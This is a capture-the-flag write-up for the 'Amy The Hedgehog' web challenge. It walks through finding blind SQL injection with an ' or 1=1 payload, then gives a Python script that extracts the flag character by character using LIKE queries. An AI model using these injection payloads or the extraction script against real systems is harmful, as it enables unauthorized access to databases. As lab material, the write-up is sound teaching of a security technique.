# Amy The Hedgehog
> Hi guys! I just learned sqlite3 build my own websiteeee. Come visit my [my website](http://litctf.live:31770/) pleaseeee i am ami the dhedghog!!! :3
> ( ◡‿◡ \*)

## Identifying the vulnerability
Sending a random string to the server returns the text `wrong!!! (｡•̀ᴗ-)✧`. Let's try SQL injection by closing the string and using `union` operator:
```sql
' or 1=1; --
```
This time we get a different response: `(≧U≦❁) You got it!!!`. This means that the website is vulnerable to blind SQL injection.

## Exploiting the vulnerability
We can use Python with requests module to automate the process of guessing subsequent characters of the flag with the help of `like` operator. The idea is simple: we send payloads like:
```sql
' or name like 'tested_flag_prefix%' ESCAPE "$"; --
```
If the flag starts with `tested_flag_prefix`, we receive the "You got it" response, otherwise we get "wrong!!!" response. This way we can eventually retrieve the whole flag. We mustn't forget though to escape meta-characters used by `like` operator (we know that the database is SQLite and therefore we must define our own escaping character using `ESCAPE "$"`).
The following Python script retrieves the flag:
```py
import requests
from string import printable

flag = 'LITCTF{'

while flag[-1] != '}':
	for c in printable:
		print(f'Trying {flag + c}')
		char = c if c not in ('%', '_', '$') else f'${c}'
		r = requests.post(
			'http://litctf.live:31770/',
			data={
				'name': f'\' or name like \'{flag + char}%\' ESCAPE "$"; -- '
			}
		)
		if 'wrong' not in r.text:
			flag += c
			break
	else:
		print('Char not found!')
```

## Flag
`LITCTF{sldjf}`
